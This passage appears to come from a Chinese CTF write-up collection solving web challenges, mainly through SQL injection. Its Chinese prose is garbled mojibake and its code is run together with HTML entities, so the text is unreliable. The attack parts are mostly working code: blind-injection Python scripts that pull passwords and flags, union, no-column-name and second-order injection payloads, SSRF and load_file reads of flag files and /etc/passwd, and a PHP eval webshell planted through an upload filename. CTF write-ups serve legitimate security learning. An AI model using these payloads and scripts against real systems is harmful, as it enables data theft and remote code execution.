public $age = 233; public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;$data = new UserInfo();echo serialize($data);?&gt; åˆ©ç”¨getBlogContentsè°ƒç”¨çš„curlè¿›è¡ŒSSRFæ”»å‡»ï¼Œå››ä¸ªå‚æ•°éƒ½è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ç¬¬4ä¸ªç”¨æ¥è¯»ç”¨æˆ·æ•°æ®çš„ï¼š 1payload&#x3D;?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; åœ¨iframeä¸­å¾—åˆ°flagã€‚ éé¢„æœŸè§£ æºç æ²¡æœ‰è¿‡æ»¤load_fileå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼š 1?no&#x3D;0+unIon&#x2F;**&#x2F;select+1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),1,1 load_fileä½¿ç”¨æ¡ä»¶ï¼š 1.ç”¨æˆ·æœ‰å¾ˆé«˜çš„æƒé™ 2.çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ BJDCTF 2nd ç®€å•æ³¨å…¥ è€ƒç‚¹ MySQLç›²æ³¨ Pythonè„šæœ¬ç¼–å†™ è§£é¢˜ è®¿é—®robots.txté¡µé¢æç¤ºæœ‰hint.phpï¼š 1234Only u input the correct password then u can get the flagand p3rh4ps wants a girl friend.select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;; fuzzä¸€ä¸‹å‘ç°ï¼šç©ºæ ¼å•åŒå¼•å·è¿‡æ»¤ï¼Œ\\æ²¡è¿‡æ»¤ï¼Œå¦‚æœæœªå¯¹$_POST[&quot;username&quot;]è¿›è¡Œå…¶ä»–é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨åæ–œæ å°†ç¬¬äºŒä¸ªå•å¼•å·è½¬ä¹‰ï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªå•å¼•å·å’Œç¬¬ä¸‰ä¸ªå•å¼•å·æ„æˆè¯­å¥ï¼šusername='xxxxx', $_POST[&quot;password&quot;]åˆ™å¯è¿›è¡Œç›²æ³¨ã€‚ username=admin\\ password=or/**/length(database())&gt;0#å›æ˜¾BJD needs to be stronger username=admin\\ password=or/**/length(database())&lt;0#å›æ˜¾You konw ,P3rh4ps needs a girl friend å†™ç›²æ³¨è„šæœ¬ 1234567891011121314151617181920212223242526272829303132import requestsfrom time import sleepurl = &#x27;http://2cfb1e37-5400-4888-895d-bd5db365a250.node3.buuoj.cn/index.php&#x27;data = &#123; &#x27;username&#x27;: &#x27;admin\\\\&#x27;, &#x27;password&#x27;: &#x27;&#x27;&#125;flag = &#x27;BJD needs to be stronger&#x27;result = &#x27;&#x27;for i in range(1, 50): sleep(0.5) high = 127 low = 32 while high &gt; low: mid = (high + low) // 2 payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid) data[&#x27;password&#x27;] = payload rs = requests.post(url=url, data=data) if flag in rs.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) å¾—åˆ°password:OhyOuFOuNdit SWPUCTF2019 Web1 è€ƒç‚¹ äºŒæ¬¡æ³¨å…¥ MySQLæ— åˆ—åæ³¨å…¥ MySQL5.7+ æ–°ç‰¹æ€§ çŸ¥è¯†å‚¨å¤‡ æ— åˆ—åæ³¨å…¥ä¸»è¦æ˜¯é€‚ç”¨äºå·²ç»è·å–åˆ°æ•°æ®è¡¨ï¼Œä½†æ— æ³•æŸ¥è¯¢åˆ—çš„æƒ…å†µä¸‹ï¼Œåœ¨CTFé¢˜ç›®ä¸­å¸¸å¸¸æ˜¯å› ä¸ºinformation_schemaè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•è·å–åˆ—åã€‚ æ— åˆ—åæ³¨å…¥çš„åŸç†å…¶å®ç±»ä¼¼äºå°†æˆ‘ä»¬ä¸çŸ¥é“çš„åˆ—åï¼Œè¿›è¡Œå–åˆ«åæ“ä½œï¼Œåœ¨å–åˆ«åçš„åŒæ—¶è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„å­—æ®µå¤šäºæ•°æ®è¡¨ä¸­åˆ—çš„æ—¶å€™ï¼Œä¼šå‡ºç°æŠ¥é”™ã€‚ åœ¨ information_schema ä¸­ï¼Œé™¤äº† SCHEMATAã€TABLESã€COLUMNS æœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„ mysql 5.7ä»¥ä¸Šï¼Œè¿˜æœ‰ INNODB_TABLES åŠ INNODB_COLUMNS ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚ ä¾‹å¦‚å½“å‰æœ‰ä¸€ä¸ªuserè¡¨ å‘ç°è¯¥æ•°æ®è¡¨ä¸­æœ‰3åˆ—ï¼Œæˆ‘ä»¬ä½¿ç”¨æ— åˆ—åæŸ¥è¯¢çš„æ–¹å¼å°è¯•æŸ¥è¯¢ä¸€ä¸‹ å°è¯•å¤šä¸€ä¸ªå­—æ®µæˆ–è€…å°‘ä¸€ä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼š ä»ç„¶æŠ¥é”™ï¼Œè¯æ˜æ— åˆ—åæ³¨å…¥å¿…é¡»ä¸€ä¸€å¯¹åº”æ‰€æŸ¥è¯¢æ•°æ®è¡¨çš„åˆ—æ•°ã€‚ å¯¹ä¸€åˆ—æ•°æ®è¿›è¡ŒæŸ¥è¯¢ï¼š æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½åã€‚ å½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œ` ä¼šè¢«è¿‡æ»¤ã€‚å½“ ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š è§£é¢˜ æ³¨å†Œadminçš„æ—¶å€™æç¤ºç”¨æˆ·å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆå°±éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œç™»å½•åå‘è¡¨å¹¿å‘Šï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…é¡µï¼Œç¬¬ä¸€ååº”çœ‹urlä¼ å…¥äº†idå­—æ®µï¼Œç»è¿‡æµ‹è¯•åï¼Œidå­—æ®µä¸å­˜åœ¨SQLæ³¨å…¥ã€‚ å†è€ƒè™‘æ˜¯ä¸æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå‘è¡¨å¹¿å‘Šåï¼ŒæŸ¥è¯¢å¹¿å‘Šè¯¦æƒ…çš„æ—¶å€™äº§ç”Ÿæ³¨å…¥ã€‚ æµ‹è¯•æ³¨å…¥ç‚¹ï¼š ç‚¹å‡»å¹¿å‘Šè¯¦æƒ… å‘ç°æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ï¼Œå¯æ ¹æ®æŠ¥é”™çš„ä¿¡æ¯å»æ„é€ sqlæ³¨å…¥è¯­å¥ï¼Œfuzzä¸€ä¸‹è¢«è¿‡æ»¤çš„å­—ç¬¦å’Œç¬¦å·ã€‚ å‘ç°ç©ºæ ¼ï¼Œorï¼Œ#ï¼Œâ€“+ç­‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨æ³¨é‡Šç¬¦å·æ¥ä»£æ›¿ç©ºæ ¼ã€‚æŠ¥é”™è¿‡æ»¤äº†extractvalue å’Œ updatexmlï¼Œäºæ˜¯è€ƒè™‘ç”¨ union è”åˆæ³¨å…¥ã€‚ å°è¯•é—­åˆå•å¼•å·ï¼š 1aaa&#39;,&#39; å…ˆåˆ¤æ–­å­—æ®µçš„ä¸ªæ•°ï¼Œorè¢«è¿‡æ»¤äº†ä¸èƒ½ç”¨order byï¼Œä½†æ˜¯å¯ä»¥ç”¨group byæ¥æ›¿æ¢ 111&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39; åˆ¤æ–­å›æ˜¾ä½ 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; æŸ¥è¯¢ä¸€ä¸‹æ•°æ®åº“åç§°å’Œç‰ˆæœ¬ 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; ç”±äºorè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨information_schemaï¼Œä½†æ˜¯æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†å‚¨å¤‡ï¼Œå¦‚æœæ•°æ®è¡¨çš„å¼•æ“æ˜¯innodbï¼Œ è¿˜å¯ä»¥ç”¨mysql.innodb_table_statsè·å–è¡¨å https://mariadb.com/kb/en/mysqlinnodb_table_stats/ 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; æˆ‘ä»¬æ— æ³•çŸ¥é“åˆ—åï¼Œå¯ä»¥é€šè¿‡æ— åˆ—åæ³¨å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼Œå…ˆæŸ¥è¯¢usersè¡¨ã€‚ 111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39; åè®° å¦‚æœè¿‡æ»¤äº†é€—å·ï¼Œå¯ä»¥ç”¨joinå…³é”®å­—è¿æ¥ 12345678910mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 1 | 2 | 3 |+----+----------+------------+4 rows in set (0.00 sec) ç½‘é¼æ¯2018 comment è€ƒç‚¹ Gitæºç æ¢å¤ ä»£ç å®¡è®¡ äºŒæ¬¡æ³¨å…¥ è§£é¢˜ ä¸Šæ¥æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå…ˆç”¨dirmapæ‰«ä¸€éå‘ç°Gitæ–‡ä»¶å¤¹ï¼Œç”¨GitHackæŠŠæºç dumpä¸‹æ¥ï¼Œåªæœ‰ä¸€ä¸ªwrite_do.phpæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å®Œæ•´ï¼Œéœ€è¦æŸ¥çœ‹æäº¤å†å²ã€‚å› ä¸ºlijiejieçš„GitHackä¸èƒ½æŠŠ.gitæ–‡ä»¶å¤¹åŒæ—¶dumpä¸‹æ¥ï¼Œæ‰€ä»¥è¿™é‡Œæ¢æˆwangyihangçš„GitHackerã€‚ æŸ¥çœ‹ç¬¬ä¸€ä¸ªcommit 12$ git reset --hard e5b2a2443c2b6d395d06960123142bc91123148cHEAD ç°åœ¨ä½äº e5b2a24 WIP on master: bfbdf21 add write_do.php å¾—åˆ°write_do.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123; header(&quot;Location: ./index.php&quot;);&#125;?&gt; æäº¤è¯„è®ºè¿˜éœ€è¦ç™»å½•ï¼Œæ ¹æ®ç™»å½•æ¡†ä¸Šçš„place_holdï¼Œåº”è¯¥æ˜¯è¦çˆ†ç ´å¯†ç çš„åä¸‰ä½ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬è·‘ä¸€ä¸‹å°±å‡ºæ¥ï¼Œä»£ç å†™å¤ªçƒ‚ä¸è´´äº†ï¼šzhangwei/zhangwei666 æ¥ç€å®¡è®¡æºç ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢ç¬¬12-14è¡Œéƒ½å¯¹ POST ä¼ æ¥category ã€ title ã€contentä¸‰ä¸ªå‚æ•°è¿›è¡Œäº†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œç„¶è€Œåœ¨ç¬¬28è¡Œå’Œç¬¬30-33è¡Œå¤„ç›´æ¥å°†ä»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®ï¼Œæœªç»ä»»ä½•è¿‡æ»¤æ‹¼æ¥åˆ°SQLè¯­å¥ ä¸­ï¼Œå¹¶ä¸”contentçš„å€¼ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œè¿™å°±å­˜åœ¨äºŒæ¬¡æ³¨å…¥ ã€‚ addslashesä¼šå°†ä¼ å…¥çš„ä¿¡æ¯éƒ½ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯æ•°æ®åº“ä¼šè‡ªåŠ¨æ¸…é™¤åæ–œæ ã€‚ ä¸‹é¢è¯´è¯´äºŒæ¬¡æ³¨å…¥çš„æ”»å‡»è¿‡ç¨‹ï¼š å…ˆè¿›å…¥ write æ–¹æ³•ï¼Œå°†payloadï¼š ',content=database(),/* æ’å…¥ board è¡¨çš„ category å­—æ®µä¸­ æ­¤æ—¶payloadä¸ºtitle=111&amp;category=',content=database(),/*&amp;content=1 å†è¿›å…¥ comment æ–¹æ³•ï¼Œç¨‹åºå°† board è¡¨ä¸­çš„ category å­—æ®µå–å‡ºï¼Œæ²¡è¿›è¡Œè¿‡æ»¤ï¼Œæ‹¼æ¥åˆ°æ–°çš„ insert è¯­å¥ä¸­ã€‚ç”±äºæˆ‘ä»¬ä¹‹å‰çš„ payload ä¸­å¸¦æœ‰ /* ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆå®ƒï¼Œå³æˆ‘ä»¬åœ¨è¯„è®ºå¤„æäº¤ */# (å¯¹åº” content å˜é‡çš„å€¼)ï¼Œç”¨äºé—­åˆ/* ç„¶åç¨‹åºæ‰§è¡Œç¬¬äºŒä¸ªSQLè¯­å¥ï¼Œå¹¶å°†ç”¨æˆ·æäº¤çš„contentå€¼æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œæˆ‘ä»¬çš„ payload ï¼š ',content=user(),/* å°±ä¼šæ˜¾ç¤ºå‡ºå½“å‰ç”¨æˆ·ã€‚ æŸ¥çœ‹å½“å‰ç”¨æˆ· å¦‚æœæ˜¯rootç”¨æˆ·ï¼Œä¸€èˆ¬ flag å°±ä¸ä¼šåœ¨æ•°æ®åº“é‡Œé¢(å› ä¸ºå¦‚æœåœ¨æ•°æ®åº“ä¸­ï¼Œä¸éœ€è¦è¿™ä¹ˆé«˜çš„æƒé™ï¼Œå®é™…ä¹Ÿç¡®å®æ²¡æœ‰ã€‚ åº”è¯¥æ˜¯è¦ç”¨SQLè¯­å¥è¯»å–flagæ–‡ä»¶äº†ã€‚ å…ˆç”¨/etc/passwdåšä¸€ä¸ªéªŒè¯ æœ‰ä¸€ä¸ªwwwç”¨æˆ·ï¼ŒæŸ¥çœ‹ä»–çš„å†å²å‘½ä»¤ å¯ä»¥å‘ç°ä»–åˆ é™¤äº†ä¸€ä¸ª.DS_Storeæ–‡ä»¶ï¼Œä½†æ˜¯è¿˜å­˜åœ¨äº/tmp/htmlç›®å½•ä¸­ï¼Œç”±äºè¿™ä¸ªæ–‡ä»¶æœ‰å¾ˆå¤šä¸å¯è§å­—ç¬¦ä¸èƒ½ç›´æ¥ç”¨ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå…ˆå¯¹å…¶è¿›è¡Œ16è¿›åˆ¶ç¼–ç  å†è½¬æ¢æˆASCII flagæ–‡ä»¶åflag_8946e1ff1ee3e40f.php å†è§£ç å°±å¯ä»¥å¾—åˆ°flagã€‚ CISCN2019 easyweb è€ƒç‚¹ æºç æ³„éœ² MySQLç›²æ³¨ PHPçŸ­æ ‡ç­¾ è§£é¢˜ åˆæ˜¯ä¸€é“ç›²æ³¨çš„é¢˜ç›®ï¼Œè¿˜æ˜¯æ²¡æœ‰åšå‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚ robots.txtæç¤ºæœ‰bakå¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•äº†index.php.bakå’Œuser.php.bakæ— æœåç”¨dirmapæ‰«æï¼Œå‘ç°äº†image.php.bak 123456789101112131415161718&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); åŸºæœ¬æ€è·¯ï¼šboolç›²æ³¨ï¼Œè¯­å¥æˆåŠŸçš„è¯ï¼Œå°±è®©id = 1ï¼Œå›æ˜¾æ­£å¸¸ï¼Œé”™è¯¯çš„è¯ id = 0ï¼Œå°±ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚ å•å¼•å·é€ƒé€¸çš„æ–¹æ³•æ˜¯ç”¨\\0æ¥è½¬ä¹‰æ‰å®ƒçš„å•å¼•å·ã€‚è¾“å…¥\\0ï¼Œç»è¿‡addslasheså‡½æ•°ä¼šå…ˆå˜æˆ\\\\0,ç„¶åç»è¿‡â€œstr_replaceâ€å‡½æ•°ï¼Œä¼šå˜æˆ\\,è¿™æ ·ï¼Œå°±æŠŠidåé¢çš„å•å¼•å·ç»™è½¬ä¹‰äº†ã€‚ SQLç›²æ³¨è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728import requestsfrom time import sleepurl = &quot;http://143e2c2b-3448-4468-aeee-95cd35c73be0.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;#payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;#payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;#payload = &quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;payload = &quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;flag = &quot;JFIF&quot;result = &quot;&quot;for i in range(1, 100): sleep(0.5) low = 32 high = 127 while high &gt; low: mid = (high + low) &gt;&gt; 1 response = requests.get(url + payload.format(i, mid)) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) ç™»å½•åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œç»è¿‡æµ‹è¯•åå¯ä»¥å‘ç°ï¼Œupload.phpæŠŠä¸Šä¼ çš„æ–‡ä»¶åå†™å…¥äº†ä¸€ä¸ªphpæ–‡ä»¶åç¼€çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¸”è·¯å¾„å·²çŸ¥ã€‚ä½†æ˜¯æ–‡ä»¶åä¼šè¿‡æ»¤phpï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ã€‚ 1filename&#x3D;&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt; ç„¶åèšå‰‘ç›´æ¥è¿æ¥ã€‚ WUSTCTF2020 é¢œå€¼æˆç»©æŸ¥è¯¢ è€ƒç‚¹ MySQLç›²æ³¨ è§£é¢˜ æ¯”è¾ƒæ˜æ˜¾çš„GETå‹çš„SQLæ³¨å…¥ï¼ŒFUZZä¸€ä¸‹ å‘ç°å¥½åƒæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼ŒéªŒè¯ä¸€ä¸‹ æ¥ä¸‹æ¥å°±æ˜¯ç›´æ¥å†™ç›²æ³¨è„šæœ¬äº† 12345678910111213141516171819202122232425import requestsurl = &quot;http://a55db98c-72b1-40e8-b771-61b1bc60cd9d.node3.buuoj.cn/?stunum=&quot;flag = &quot;Hi admin, your score is: 100&quot;result = &quot;&quot;for i in range(1, 100): low = 32 high = 127 while high &gt; low: mid = (high + low) &gt;&gt; 1 #payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot; #payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot; payload = &quot;if(ascii(substr((select(group_concat(flag,0x3a,value))from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot; response = requests.post(url+payload.format(i, mid)) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) æ‹“å±• æˆ‘ä»¬å†å¹æ¯›æ±‚ç–µä¸€ç‚¹ï¼Œä¸Šä¸€ä¸ªè„šæœ¬è·‘å‡ºæ¥çš„flagéƒ½æ˜¯å¤§å†™å­—æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•åŒºåˆ†å¤§å°å†™å‘¢ã€‚ å‚è€ƒä¸­çš„ç¬¬äºŒç¯‡æ–‡ç« å·²ç»å‘Šè¯‰äº†æˆ‘ä»¬ç­”æ¡ˆï¼Œæƒ³åŠæ³•æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶åï¼Œè¿›è¡Œå­—èŠ‚å¯¹å­—èŠ‚çš„æ¯”è¾ƒã€‚ä½†æ˜¯å‡½æ•°BINARYä¸­çš„inè¢«ç¦æ‰äº†ï¼Œä½œè€…åˆå‘ç°äº†ä¸€ç§æ€è·¯ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²è¿æ¥ä¸€ä¸ªäºŒè¿›åˆ¶çš„å€¼æ—¶CONCAT(&quot;aa&quot;, BINARY(&quot;BB&quot;))ï¼Œå…¶å¾—åˆ°çš„ä¹Ÿå°†æ˜¯äºŒè¿›åˆ¶ã€‚ å¹¶ä¸”MySQLä¸­çš„JSONå¯¹è±¡æ˜¯äºŒè¿›åˆ¶å¯¹è±¡ï¼Œå› æ­¤ï¼ŒCAST(0 AS JSON)ä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿›è€ŒSELECT CONCAT(â€œAâ€, CAST(0 AS JSON))ä¹Ÿä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ æ‰€ä»¥æˆ‘ä»¬çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªpayloadèƒ½å¦å¯è¡Œï¼š 12||(select 1,concat(&#39;&#123;&#125;&#39;,cast(&#39;0&#39; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh) è¿”å›äº†errorã€‚æˆ‘çŒœåº”è¯¥æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œç”¨ç¬¬ä¸€ä¸ªç›²æ³¨è„šæœ¬æŸ¥çœ‹ä¸€ä¸‹version()ï¼Œå‘ç°æ˜¯MariaDB 10.2.26ã€‚ æŸ¥è¯¢ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼ŒMariaDBåœ¨10.2.7æ‰åŠ å…¥äº†JSONæ•°æ®ç±»å‹ã€‚ æ— æœã€‚ å‚è€ƒ https://www.gem-love.com/ctf/1782.html https://nosec.org/home/detail/3830.html RoarCTF2019 Online Proxy è€ƒç‚¹ XFFæ³¨å…¥ äºŒæ¬¡æ³¨å…¥ ç›²æ³¨ é¢˜è§£ è¿™é“é¢˜çš„æ³¨å…¥ç‚¹åœ¨X-Forwarded-Forï¼Œåˆ©ç”¨XFFæ¥æ›´æ”¹IPåœ°å€ï¼Œå¯ä»¥å‘ç°IPè¢«ä¿å­˜å¹¶è¾“å‡ºäº†ã€‚ æ—¢ç„¶ä»–çš„last-ipå’Œcurrent-ipä¼šæ›´æ–°ï¼Œç”±æ­¤å¯ä»¥çŒœæƒ³ä»–ä¸æ•°æ®åº“è¿›è¡Œäº†äº¤äº’ 1INSERT INTO table_name (current-ip,last-ip ) VALUES (&#x27;$current-ip&#x27;,&#x27;$last-ip&#x27; ); ç”±äºè¿™é¢˜æœ‰å›æ˜¾ï¼Œå› æ­¤ï¼Œå¯ä»¥è€ƒè™‘äºŒæ¬¡æ³¨å…¥ã€‚ é¦–å…ˆç”¨ä¸‹é¢è¿™ä¸ªpayloadéªŒè¯ä¸€ä¸‹èƒ½ä¸èƒ½æˆåŠŸåœ°é—­åˆè¯­å¥ï¼š 10&#39; or ascii(substr((select(database())),1,1))&gt;100 or &#39;0 å†éšä¾¿è¾“å…¥ å†æ¬¡å‘é€è¯·æ±‚ éªŒè¯æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ç›²æ³¨è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsurl = &quot;http://node3.buuoj.cn:29354/&quot;# è¿™ä¸ªheadå¤´å¥½åƒå¿…é¡»åŠ cookiehead = &#123; &quot;X-Forwarded-For&quot;: &quot;&quot;, &quot;Cookie&quot;: &quot;track_uuid=60661451-cdab-4a74-95b4-74d6a66945a9&quot;&#125;# #æŸ¥åº“å# payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;# #æŸ¥è¡¨å# payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;# #æŸ¥åˆ—å# payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;# æŸ¥flagpayload = &quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;flag = &quot;&quot;for i in range(1, 1000): low = 32 high = 137 mid = (low + high) // 2 while low &lt; high: &#x27;&#x27;&#x27;æ’å…¥sqlè¯­å¥&#x27;&#x27;&#x27; payload1 = payload.format(i, mid) head[&quot;X-Forwarded-For&quot;] = payload1 requests.get(url, headers=head) 